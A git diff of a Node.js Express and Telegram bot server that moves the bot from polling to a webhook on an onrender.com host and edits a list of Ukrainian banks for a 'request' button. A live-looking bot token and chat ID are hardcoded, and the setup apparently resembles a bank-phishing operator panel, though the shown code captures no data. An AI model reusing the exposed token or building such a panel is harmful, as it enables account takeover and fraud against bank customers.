@@ -5,32 +5,38 @@ const WebSocket = require('ws');
 const path = require('path');
 require('dotenv').config();
 
-// =======================================================================
-// --- НАСТРОЙКИ: Используйте env vars ---
+// Настройки
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7607171529:AAF4Tch8CyVujvaMhN33_tlasoGAHVmxv64';
 const CHAT_ID = process.env.CHAT_ID || '-4970332008';
-// =======================================================================
+const WEBHOOK_URL = 'https://new-l8h6.onrender.com/bot' + TELEGRAM_BOT_TOKEN;
 
-// --- СПИСОК БАНКІВ ДЛЯ КНОПКИ "ЗАПРОС" ---
 const banksForRequestButton = [
     'Райффайзен', 'Альянс', 'ПУМБ', 'OTP Bank',
-    'Восток', 'Izibank', 'NovaPay', 'Укрсиб'
+    'Восток', 'Izibank', 'Укрсиб'
 ];
 
 const app = express();
 app.use(express.json());
 app.use(cors());
 
-// Обслуживание index.html из корня
+// Обслуживание index.html
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
+const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
 
-// Обработка ошибок Telegram polling
-bot.on('polling_error', (error) => {
-    console.error('Telegram polling error:', error);
+// Установка webhook
+bot.setWebHook(WEBHOOK_URL).then(() => {
+    console.log(`Webhook set to ${WEBHOOK_URL}`);
+}).catch(err => {
+    console.error('Error setting webhook:', err);
+});
+
+// Маршрут для Telegram webhook
+app.post('/bot' + TELEGRAM_BOT_TOKEN, (req, res) => {
+    bot.processUpdate(req.body);
+    res.sendStatus(200);
 });
 
 const server = require('http').createServer(app);
@@ -200,7 +206,6 @@ bot.on('callback_query', (callbackQuery) => {
     }
 });
 
-// Глобальная обработка ошибок Express
 app.use((err, req, res, next) => {
     console.error('Server error:', err);
     res.status(500).json({ message: 'Internal Server Error' });
